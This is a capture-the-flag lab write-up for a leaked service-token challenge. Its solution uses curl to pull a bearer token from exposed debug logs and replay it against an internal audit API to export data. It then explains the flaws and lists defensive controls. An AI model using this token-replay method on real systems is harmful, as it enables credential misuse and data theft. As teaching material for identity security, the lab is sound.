# Non-Human Identity: Leaked TrailGuard Service Token

TrailGuard AI runs as the non-human identity `svc-trailguard-bot`. During a
rollout, the HTTP debug logger was left enabled and wrote a live bearer token
into the service logs. The internal audit API trusts that token and the token
carries more scope than the worker needs.

## Target

- `http://trailguard-nhi.lab:8080` — service health and identity card
- `http://trailguard-nhi.lab:8080/logs` — debug log viewer
- `http://trailguard-nhi.lab:8080/api/logs` — plain-text logs for `curl`
- `http://trailguard-nhi.lab:8080/api/internal/audit` — client audit API
- `http://trailguard-nhi.lab:8080/health` — health probe

## Solution

1. Read the logs:

```bash
curl -s http://trailguard-nhi.lab:8080/api/logs
```

2. Copy the token after `Authorization: Bearer`.

3. Call the audit API:

```bash
curl -s -H 'Authorization: Bearer ocr-svc-trailguard-7c1e4a9b' \
  http://trailguard-nhi.lab:8080/api/internal/audit
```

The response contains the export marker, which is the flag.

## Why it works

- The logger records the full `Authorization` header.
- The audit API checks only whether the token is valid, not which workload is
  presenting it.
- The service identity has `audit:export` and `directory:read` in addition to
  the `audit:read` the worker actually needs.

## Defensive controls

- Redact `Authorization`, cookies, and token-shaped values at the logging layer.
- Scope the workload identity to the minimum required API and record the
  audience.
- Bind tokens to the workload (mTLS or workload identity) and keep lifetimes
  short.
- Rotate automatically and revoke on exposure.
- Alert on audit exports outside the scheduled window or from a new workload.

## Safety

The service is deterministic and dependency-free. It has no external network
access and no real credentials. The container runs read-only, unprivileged, with
all capabilities dropped.
